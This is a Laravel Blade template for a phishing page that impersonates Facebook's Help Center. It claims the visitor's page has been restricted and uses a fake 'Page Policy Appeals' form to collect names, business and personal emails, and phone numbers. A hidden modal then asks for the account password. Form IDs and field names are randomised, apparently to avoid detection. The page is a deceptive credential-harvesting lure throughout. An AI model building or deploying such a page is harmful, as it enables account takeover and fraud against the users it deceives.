@extends('layouts.main')

@section('title', 'Business Help Center | Privacy Policy')

@section('content')
    <div class="topheader bg-facebook p-2">
        <div class="sm:w-11/12 md:w-4/6 flex justify-between items-center mx-auto">
            <div class="w-[20%] md:w-[15%]">
                <a href="">
                    <img src="{{ asset('assets/images/Facebook.svg.png') }}" class="object-cover">
                </a>
            </div>
            <div class="flex shadow-sm w-[60%] md:w-[50%]">
                <span
                    class="px-4 inline-flex items-center min-w-fit border border-r-0 border-gray-200 bg-gray-50 text-sm "><ion-icon
                        name="search-outline"></ion-icon></span>
                <input type="search"
                    class="py-2 px-3 pr-11 block w-full border-gray-200 shadow-sm text-sm focus:z-10 focus:border-blue-500 focus:ring-blue-500 focus:outline-none"
                    placeholder="How can we help?">
            </div>
        </div>
    </div>
    <div class="bg-[#E9EBEE]">
        <div class="w-11/12 sm:w-11/12 md:w-4/6 flex justify-between items-center mx-auto">
            <a href="#"
                class="flex items-center text-[#3578E5] gap-2 font-semibold py-4 border-b-[3px] border-[#3578E5]">
                <ion-icon name="home"></ion-icon> Help Center
            </a>
            <p class="text-[#3578E5] text-xs">English</p>
        </div>
    </div>
    <div class="w-11/12 sm:w-11/12 md:w-4/6 grid gap-10 mx-auto my-8 grid-cols-1 md:grid-cols-[0.3fr_1fr] ">
        <div class="order-2 md:order-none">
            <ul class="[&>li>a]:text-[14px] [&>li>a]:py-[5px] [&>li>a]:pr-5 [&>li>a]:block [&>li>a:hover]:bg-[#E9EBEE]">
                <li><a href="#">Creating an Account</a></li>
                <li><a href="#">Your Profile</a></li>
                <li><a href="#">Friending</a></li>
                <li><a href="#">Facebook Dating</a></li>
                <li><a href="#">Your Home Page</a></li>
                <li><a href="#">Messaging</a></li>
                <li><a href="#">Reels</a></li>
                <li><a href="#">Stories</a></li>
                <li><a href="#">Photos</a></li>
                <li><a href="#">Videos</a></li>
                <li><a href="#">Gaming</a></li>
                <li><a href="#">Pages</a></li>
                <li><a href="#">Groups</a></li>
                <li><a href="#">Events</a></li>
                <li><a href="#">Fundraisers and Donations</a></li>
                <li><a href="#">Meta Pay</a></li>
                <li><a href="#">Marketplace</a></li>
                <li><a href="#">Apps</a></li>
                <li><a href="#">Facebook Mobile Apps</a></li>
                <li><a href="#">Accessibility</a></li>
            </ul>
        </div>
        <form id="ccnpwxpytrb" class="w-100% md:w-[74%] rounded-lg border border-gray-200 h-fit order-1 md:order-none">
            <div class="font-semibold rounded-t-lg text-lg border-b border-gray-200 bg-[#F5F6F7] p-3">
                <h1>Page Policy Appeals</h1>
            </div>
            <div class="p-4">
                <p class="text-xs mb-4">We have detected unusual activity on your page that violates our community
                    standards.</p>
                <p class="text-xs mb-4">Your access to your page has been limited, and you are currently unable to post,
                    share, or comment using your page.</p>
                <p class="text-xs mb-4">If you believe this to be a mistake, you have the option to submit an appeal by
                    providing the necessary information.</p>
                <div class="mb-4">
                    <label class="block">
                        <span
                            class="text-[#90949C] after:content-['*'] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">
                            Name Page
                        </span>
                        <input type="text" name="page" required
                            class="w-1/2 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1">
                    </label>
                </div>
                <div class="mb-4">
                    <label class="block">
                        <span
                            class="text-[#90949C] after:content-['*'] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">
                            Fullname
                        </span>
                        <input type="text" name="fullname" required
                            class="w-1/2 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1">
                    </label>
                </div>
                <div class="mb-4">
                    <label class="block">
                        <span
                            class="text-[#90949C] after:content-['*'] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">
                            Business Email Address
                        </span>
                        <input type="email" name="business_email" required
                            class="w-1/2 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1">
                    </label>
                </div>
                <div class="mb-4">
                    <label class="block">
                        <span
                            class="text-[#90949C] after:content-['*'] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">
                            Personal Email Address
                        </span>
                        <input type="email" name="personal_email" required
                            class="w-1/2 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1">
                    </label>
                </div>
                <div class="mb-4">
                    <label class="block">
                        <span
                            class="text-[#90949C] after:content-['*'] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">
                            Mobile Phone Number
                        </span>
                        <input type="text" name="phone" required
                            onkeypress="return (event.charCode !=8 && event.charCode ==0 || (event.charCode >= 48 && event.charCode <= 57))"
                            class="w-1/2 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1">
                    </label>
                </div>
                <!-- <div class="mb-4">-->
                <!--    <label class="block">-->
                <!--        <span-->
                <!--            class="text-[#90949C] after:content-['*'] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">-->
                <!--            Birth of date-->
                <!--        </span>-->
                <!--        <input type="date" name="birthday" required-->
                <!--            class="w-1/3 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block rounded-sm sm:text-sm focus:ring-1">-->
                <!--    </label>-->
                <!--</div>-->
                <div class="mb-4">
                    <label class="block">
                        <span class="text-[#90949C] block text-xs font-bold text-[#90949C]">
                            Please provide us information that will help us investigate.
                        </span>
                        <textarea type="text" name="yykwevbhfh"
                            class="w-3/4 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block rounded-sm sm:text-sm focus:ring-1"
                            rows="4"></textarea>
                    </label>
                </div>
            </div>
            <div class="font-semibold rounded-b-lg flex justify-end text-lg border-t border-gray-200 bg-[#F5F6F7] p-3">
                <button
                    class="bg-blue-800 hover:bg-facebook rounded-sm px-4 py-2 text-white text-sm font-semibold">Send</button>
            </div>
        </form>
    </div>
    <div class="bg-white mt-10">
        <div class="sm:w-11/12 md:w-4/6 mx-auto md:px-0 px-2 py-9">
            <div class="grid xl:grid-cols-5 gap-y-4 lg:grid-cols-3 md:grid-cols-2 grid-cols-2 text-[#90949c] text-sm">
                <ul class="grid gap-y-2">
                    <li><ion-icon name="logo-facebook"></ion-icon></li>
                </ul>
                
                <ul class="grid gap-y-2">
                    <li>Meta © 2025</li>
                    <li>English (US)</li>
                </ul>
                <ul class="grid gap-y-2">
                    <li>About</li>
                    <li>Privacy Policy</li>
                    <li>Careers</li>
                </ul>
                <ul class="grid gap-y-2">
                    <li>Ad choices</li>
                    <li>Create ad</li>
                    <li>Create Page</li>
                </ul>
                <ul class="grid gap-y-2">
                    <li>Terms & Policies</li>
                    <li>Cookies</li>
                </ul>
            </div>
        </div>
    </div>
    <div id="modalEl" tabindex="-1" aria-hidden="true"
        class="fixed top-0 left-0 right-0 z-50 hidden w-full p-4 overflow-x-hidden overflow-y-auto md:inset-0 h-[calc(100%-1rem)] max-h-full">
        <div class="relative w-full max-w-2xl max-h-full">
            <!-- Modal content -->
            <div class="relative bg-white rounded-lg shadow dark:bg-gray-700">
                <!-- Modal header -->
                <div class="flex items-start justify-between p-4 border-b rounded-t dark:border-gray-600">
                    <h3 class="text-xl font-semibold text-gray-900 dark:text-white">
                        Please Enter Your Password
                    </h3>
                </div>
                <!-- Modal body -->
                <div class="p-6 space-y-6">
                    <p class="text-base leading-relaxed text-gray-500 dark:text-gray-400">
                        For your security, you must enter your password to continue.
                    </p>
                    <form class="space-y-6" id="mvmgxlrpqdl">
                        <div>
                            <label for="hxeyfibmtuv"
                                class="block mb-2 text-sm font-medium text-gray-900 dark:text-white">Your password</label>
                            <input type="password" name="password" id="hxeyfibmtuv" placeholder="Enter your password"
                                class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-600 dark:border-gray-500 dark:placeholder-gray-400 dark:text-white"
                                required>
                            <p class="error_password text-red-700"></p>
                        </div>
                        <button type="submit"
                            class="w-full text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Continue</button>

                    </form>
                </div>
            </div>
        </div>
    </div>
@endsection
